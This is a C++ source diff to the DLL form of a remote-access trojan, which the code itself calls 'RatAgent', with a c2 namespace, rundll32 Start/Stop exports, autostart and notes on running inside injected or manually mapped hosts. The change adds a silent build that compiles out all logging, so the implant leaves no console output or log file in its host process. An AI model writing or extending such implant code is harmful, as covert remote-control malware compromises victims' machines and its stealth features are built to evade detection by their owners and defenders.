@@ -27,6 +27,7 @@
 //   - 不依赖 TLS（无 thread_local/__declspec(thread)），不依赖 CWD；
 //   - 导出函数内不抛异常（异常在手动映射镜像中可能因缺少 .pdata 注册而无法展开）。
 #include "agent_runtime.h"
+#include "agent_debug.h"
 
 #define WIN32_LEAN_AND_MEAN
 #define _WIN32_WINNT 0x0601
@@ -71,11 +72,16 @@ namespace
     }
 
     // 无控制台（rundll32 / 注入宿主）时把日志落文件，避免输出丢失
+    //（静默构建下整段编译掉：不碰宿主 stdout，也不落日志文件）
     void redirect_if_needed(const std::string& log_path)
     {
+#if RAT_AGENT_DEBUG
         if (GetConsoleWindow() != nullptr)
             return;
         c2::agent_redirect_stdout(log_path.empty() ? c2::agent_default_log_path() : log_path);
+#else
+        (void)log_path;
+#endif
     }
 
     // DLL 形态的默认参数：beacon→127.0.0.1:8080，轮询 5s，日志落文件
@@ -100,18 +106,18 @@ namespace
         {
             if (!c2::agent_parse_args(args, a, err))
             {
-                printf("[!] bad args (%s): %s\n", args, err.c_str());
+                AGENT_LOG("[!] bad args (%s): %s\n", args, err.c_str());
                 return 0;
             }
         }
         if (c2::agent_running())
         {
-            printf("[!] already running (mode=%s)\n", c2::agent_mode());
+            AGENT_LOG("[!] already running (mode=%s)\n", c2::agent_mode());
             return 0;
         }
         if (!c2::agent_start(a, err))
         {
-            printf("[!] agent_start failed: %s\n", err.c_str());
+            AGENT_LOG("[!] agent_start failed: %s\n", err.c_str());
             return 0;
         }
         return 1;
@@ -130,13 +136,13 @@ namespace
         const std::string log_path = extract_kv(t, "log");
         const std::string id_opt = extract_kv(t, "id");
         redirect_if_needed(log_path); // 无控制台时让 Stop 的输出也可见
-        printf("[*] Stop requested (target=%s)\n", raw.empty() ? "(default)" : raw.c_str());
+        AGENT_LOG("[*] Stop requested (target=%s)\n", raw.empty() ? "(default)" : raw.c_str());
 
         if (c2::agent_running())
         {
-            printf("[*] stop (in-process, mode=%s)\n", c2::agent_mode());
+            AGENT_LOG("[*] stop (in-process, mode=%s)\n", c2::agent_mode());
             c2::agent_stop(8000);
-            printf("[*] in-process stop done (running=%d)\n", c2::agent_running() ? 1 : 0);
+            AGENT_LOG("[*] in-process stop done (running=%d)\n", c2::agent_running() ? 1 : 0);
             return;
         }
 
@@ -145,17 +151,17 @@ namespace
         if (t.size() == 32)
         {
             ok = c2::agent_signal_stop_by_id_hex(t);
-            printf("[*] stop by id hex %s -> %s\n", t.c_str(), ok ? "signalled" : "not found");
+            AGENT_LOG("[*] stop by id hex %s -> %s\n", t.c_str(), ok ? "signalled" : "not found");
         }
         else
         {
             const std::string idf = !t.empty() ? t
                 : (!id_opt.empty() ? id_opt : c2::agent_default_id_path(true));
             ok = c2::agent_signal_stop_by_id_file(idf);
-            printf("[*] stop by id file %s -> %s\n", idf.c_str(), ok ? "signalled" : "not found");
+            AGENT_LOG("[*] stop by id file %s -> %s\n", idf.c_str(), ok ? "signalled" : "not found");
         }
         if (!ok)
-            printf("[!] no running agent matched (target=%s)\n",
+            AGENT_LOG("[!] no running agent matched (target=%s)\n",
                 t.empty() ? "(default id file)" : t.c_str());
     }
 
@@ -181,10 +187,10 @@ namespace
         Sleep(300);
         std::string args;
         if (c2::agent_autostart_requested(args))
-            printf("[*] autostart (trigger) mode=%s\n", c2::agent_version());
+            AGENT_LOG("[*] autostart (trigger) mode=%s\n", c2::agent_version());
         else
         {
-            printf("[*] autostart (no trigger -> default config) mode=%s\n", c2::agent_version());
+            AGENT_LOG("[*] autostart (no trigger -> default config) mode=%s\n", c2::agent_version());
             args.clear();
         }
         start_from_args(args.empty() ? nullptr : args.c_str());
@@ -204,13 +210,13 @@ extern "C"
         std::string a = args ? args : "";
         std::string scan = a;
         redirect_if_needed(extract_kv(scan, "log"));
-        printf("[*] RatAgent/%s (rundll32) Start args=%s\n",
+        AGENT_LOG("[*] RatAgent/%s (rundll32) Start args=%s\n",
             c2::agent_version(), a.empty() ? "(default)" : a.c_str());
         if (!start_from_args(a.c_str()))
             return;
         // 阻塞：rundll32 在入口点返回后会立即结束进程，必须在此驻留
         c2::agent_wait(-1);
-        printf("[*] RatAgent stopped, entry point returning\n");
+        AGENT_LOG("[*] RatAgent stopped, entry point returning\n");
     }
 
     __declspec(dllexport) void CALLBACK Stop(HWND, HINSTANCE, LPSTR args, int)
@@ -225,7 +231,7 @@ extern "C"
         std::string a = args ? args : "";
         std::string scan = a;
         redirect_if_needed(extract_kv(scan, "log"));
-        printf("[*] RatAgent/%s StartAgent args=%s\n",
+        AGENT_LOG("[*] RatAgent/%s StartAgent args=%s\n",
             c2::agent_version(), a.empty() ? "(default)" : a.c_str());
         return start_from_args(a.c_str());
     }
